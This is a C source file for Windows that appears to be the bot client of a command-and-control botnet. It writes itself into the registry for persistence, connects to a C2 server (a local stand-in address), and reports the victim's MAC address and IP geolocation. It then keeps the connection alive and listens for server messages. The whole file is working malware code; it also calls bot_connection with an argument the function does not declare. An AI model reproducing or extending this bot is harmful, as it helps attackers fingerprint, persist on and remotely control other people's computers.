#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <stdio.h>
#include <winsock2.h>

#include "c2-bot.h"
#include "c2-packet.h"
#include "c2-ipgeo.h"
#include "win-reestr.h"

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 12345
#define BUFFER_SIZE 4096
#define CHECK_INTERVAL 10000

HANDLE botThreadHandle = NULL;
DWORD botThreadID;

DWORD WINAPI KeepAliveThread(LPVOID lpParam) {
    SOCKET sock = *(SOCKET*)lpParam;

    while (1) {
        Sleep(600000);

        if (keep_alive(sock) < 0) {
            printf("Failed to send keep-alive packet\n");
            break;
        } else {
            printf("Keep-alive sent.\n");
        }
    }

    return 0;
}

void bot_connection() {
    WSADATA wsaData;
    SOCKET sock;

    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    int bytes_received;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Error creating socket. Code: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Failed to connect -> server. Code %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return;
    }

    printf("Connect to server %s:%d success!\n", SERVER_IP, SERVER_PORT);

    uint8_t mac[6];
    get_mac_address(mac);
    const char *ipgeo_json = ipgeo();

    if (hello_packet(sock, mac, ipgeo_json) < 0) {
        printf("Failed to hello send packet\n");
    }

    CreateThread(NULL, 0, KeepAliveThread, &sock, 0, NULL);

    while (1) {
        bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received < 0) {
            perror("Failed to get bytes data");
            closesocket(sock);
            break;
        }

        buffer[bytes_received] = '\0';
        printf("Server answer: %s\n", buffer);
    }

    closesocket(sock);
    WSACleanup();
}

void is_server() {
    add_to_reestr();
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    while (1) {
        if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
            Sleep(CHECK_INTERVAL);
            continue;
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            Sleep(CHECK_INTERVAL);
            continue;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(SERVER_PORT);
        server.sin_addr.s_addr = inet_addr(SERVER_IP);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            bot_connection(sock);
        } else {
            closesocket(sock);
            WSACleanup();
            Sleep(10000);
        }
    }
}
